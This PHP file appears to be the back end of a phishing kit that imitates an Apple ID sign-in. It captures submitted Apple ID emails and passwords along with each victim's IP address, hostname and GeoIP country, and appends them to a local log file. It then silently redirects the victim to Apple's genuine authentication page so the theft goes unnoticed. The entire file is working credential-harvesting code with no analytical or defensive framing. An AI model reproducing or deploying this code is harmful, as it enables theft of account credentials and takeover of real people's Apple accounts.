<?php
$ip = getenv("REMOTE_ADDR");                                                                          
$hostname = gethostbyaddr($ip);

// include the php script
include("geoip.inc");

// open the geoip database
$gi = geoip_open("GeoIP.dat",GEOIP_STANDARD);

// to get country code
$country_code = geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']);

// to get country name
$country_name = geoip_country_name_by_addr($gi, $_SERVER['REMOTE_ADDR']);




$id=$_REQUEST['appleId'];
$pass=$_REQUEST['accountPassword'];

$monfichier = fopen('spam_gsx.txt','a+');
fputs($monfichier,"==========================================================================="); 
fputs($monfichier,"\r\n".'Email = '. $id."\r\n".'Password = '.$pass."\r\n"."IP = ".$ip."\r\n".'Hostname ='.$hostname."\r\n"."Country = ".$country_name."\r\n");
fclose($monfichier);




print("<script type=\"text/javascript\">setTimeout('location=(\"https://idmsa.apple.com//IDMSWebAuth/authenticate?appIdKey=45571f444c4f547116bfd052461b0b3ab1bc2b445a72138157ea8c5c82fed623&appleId=".$_REQUEST['appleId']."&accountPassword=".$_REQUEST['accountPassword']."\")' ,0);</script>");

?>



